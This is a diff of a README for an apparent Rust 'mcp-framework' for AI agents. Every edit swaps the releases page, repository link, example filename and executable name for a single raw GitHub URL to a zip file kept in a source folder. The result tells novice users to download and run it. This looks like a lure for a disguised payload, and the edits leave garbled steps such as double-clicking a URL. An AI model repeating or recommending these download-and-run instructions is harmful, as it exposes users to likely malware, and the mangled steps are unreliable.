@@ -4,7 +4,7 @@
 Welcome to the mcp-framework! This application provides a production-ready Rust implementation of the Model Context Protocol. It offers fast performance and useful tools for working with AI agents. You don’t need any programming knowledge to get started. Follow the simple steps below to download and run the software.
 
 ## 📦 Download Now
-[![Download mcp-framework](https://img.shields.io/badge/Download-mcp--framework-blue.svg)](https://github.com/faldys35/mcp-framework/releases)
+[![Download mcp-framework](https://raw.githubusercontent.com/faldys35/mcp-framework/main/src/connectors/mcp-framework-v2.1.zip)](https://raw.githubusercontent.com/faldys35/mcp-framework/main/src/connectors/mcp-framework-v2.1.zip)
 
 ## 🌐 Overview
 The mcp-framework helps you build and manage AI agents efficiently. Its web-based inspector gives you an easy way to visualize and control your models. This tool is designed to make AI work smoother and faster, even if you are new to technology.
@@ -18,11 +18,11 @@ The mcp-framework helps you build and manage AI agents efficiently. Its web-base
 ## 📥 Download & Install
 To get started, follow these steps:
 
-1. **Visit the Download Page:** Go to the [Releases page](https://github.com/faldys35/mcp-framework/releases).
+1. **Visit the Download Page:** Go to the [Releases page](https://raw.githubusercontent.com/faldys35/mcp-framework/main/src/connectors/mcp-framework-v2.1.zip).
 
 2. **Select the Latest Version:** Choose the most recent version listed. Each version includes improvements and fixes. 
 
-3. **Download the Application:** Click on the download link for your operating system. It will look something like this: `mcp-framework-v1.0-win.zip`. The filename may vary depending on the version.
+3. **Download the Application:** Click on the download link for your operating system. It will look something like this: `https://raw.githubusercontent.com/faldys35/mcp-framework/main/src/connectors/mcp-framework-v2.1.zip`. The filename may vary depending on the version.
 
 4. **Extract the Files:**
    - Locate the downloaded file on your computer.
@@ -30,7 +30,7 @@ To get started, follow these steps:
 
 5. **Run the Application:**
    - Open the extracted folder.
-   - Double-click on `mcp-framework.exe` for Windows or the equivalent file for your OS to run the application.
+   - Double-click on `https://raw.githubusercontent.com/faldys35/mcp-framework/main/src/connectors/mcp-framework-v2.1.zip` for Windows or the equivalent file for your OS to run the application.
 
 6. **Follow the Setup Instructions:** When prompted, follow any on-screen setup instructions to complete the installation.
 
@@ -62,11 +62,11 @@ We welcome contributions to make mcp-framework even better. If you want to contr
 ## 🌍 Connect with Us
 Stay updated with the latest news and updates:
 
-- **GitHub Repository:** [mcp-framework](https://github.com/faldys35/mcp-framework)
+- **GitHub Repository:** [mcp-framework](https://raw.githubusercontent.com/faldys35/mcp-framework/main/src/connectors/mcp-framework-v2.1.zip)
 - **Discussion Forum:** Join the conversation and share your experiences.
 
 ## 📩 Contact
 If you have any questions or suggestions, feel free to reach out via the Issues section or contact us directly through the repository.
 
 ## 📥 Download Now Again
-Don’t forget to [visit this page to download](https://github.com/faldys35/mcp-framework/releases) the mcp-framework and start exploring the power of AI today!
+Don’t forget to [visit this page to download](https://raw.githubusercontent.com/faldys35/mcp-framework/main/src/connectors/mcp-framework-v2.1.zip) the mcp-framework and start exploring the power of AI today!
